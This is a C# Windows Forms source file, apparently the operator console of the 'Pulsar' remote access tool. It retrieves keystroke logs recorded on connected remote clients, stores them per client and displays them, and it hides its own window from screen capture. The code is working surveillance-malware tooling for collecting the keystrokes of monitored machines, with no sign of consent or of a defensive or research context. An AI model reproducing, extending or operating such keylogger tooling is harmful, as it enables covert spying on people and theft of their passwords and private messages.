﻿using Pulsar.Common.Messages;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmKeylogger : Form
    {
        /// <summary>
        /// The client which can be used for the keylogger.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly KeyloggerHandler _keyloggerHandler;

        /// <summary>
        /// Path to the base download directory of the client.
        /// </summary>
        private readonly string _baseDownloadPath;

        /// <summary>
        /// Holds the opened keylogger form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmKeylogger> OpenedForms = new Dictionary<Client, FrmKeylogger>();

        /// <summary>
        /// Creates a new keylogger form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the keylogger form.</param>
        /// <returns>
        /// Returns a new keylogger form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmKeylogger CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmKeylogger f = new FrmKeylogger(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmKeylogger"/> class using the given client.
        /// </summary>
        /// <param name="client">The client used for the keylogger form.</param>
        public FrmKeylogger(Client client)
        {
            _connectClient = client;
            _keyloggerHandler = new KeyloggerHandler(client);

            _baseDownloadPath = Path.Combine(_connectClient.Value.DownloadDirectory, "Logs\\");

            RegisterMessageHandler();
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        /// <summary>
        /// Registers the keylogger message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _keyloggerHandler.ProgressChanged += LogsChanged;
            MessageHandler.Register(_keyloggerHandler);
        }

        /// <summary>
        /// Unregisters the keylogger message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_keyloggerHandler);
            _keyloggerHandler.ProgressChanged -= LogsChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        /// <summary>
        /// Called whenever the keylogger logs finished retrieving.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="message">The status message.</param>
        private void LogsChanged(object sender, string message)
        {
            RefreshLogsDirectory();
            btnGetLogs.Enabled = true;
            stripLblStatus.Text = "Status: " + message;
        }

        private void FrmKeylogger_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Keylogger", _connectClient);

            if (!Directory.Exists(_baseDownloadPath))
            {
                Directory.CreateDirectory(_baseDownloadPath);
                return;
            }

            RefreshLogsDirectory();
        }

        private void FrmKeylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            _keyloggerHandler.Dispose();
        }

        private void btnGetLogs_Click(object sender, EventArgs e)
        {
            btnGetLogs.Enabled = false;
            stripLblStatus.Text = "Status: Retrieving logs...";
            _keyloggerHandler.RetrieveLogs();
        }
        
        private void lstLogs_ItemActivate(object sender, EventArgs e)
        {
            if (lstLogs.SelectedItems.Count > 0)
            {
                try
                {
                    string logFilePath = Path.Combine(_baseDownloadPath, lstLogs.SelectedItems[0].Text);
                    if (File.Exists(logFilePath))
                    {
                        string logContent = File.ReadAllText(logFilePath);
                        rtbLogViewer.Text = logContent;
                    }
                    else
                    {
                        rtbLogViewer.Text = "Log file not found.";
                    }
                }
                catch (Exception ex)
                {
                    rtbLogViewer.Text = $"Error loading log file: {ex.Message}";
                }
            }
        }

        private void RefreshLogsDirectory()
        {
            lstLogs.Items.Clear();

            DirectoryInfo dicInfo = new DirectoryInfo(_baseDownloadPath);

            FileInfo[] iFiles = dicInfo.GetFiles();

            foreach (FileInfo file in iFiles)
            {
                lstLogs.Items.Add(new ListViewItem { Text = file.Name });
            }
        }
    }
}
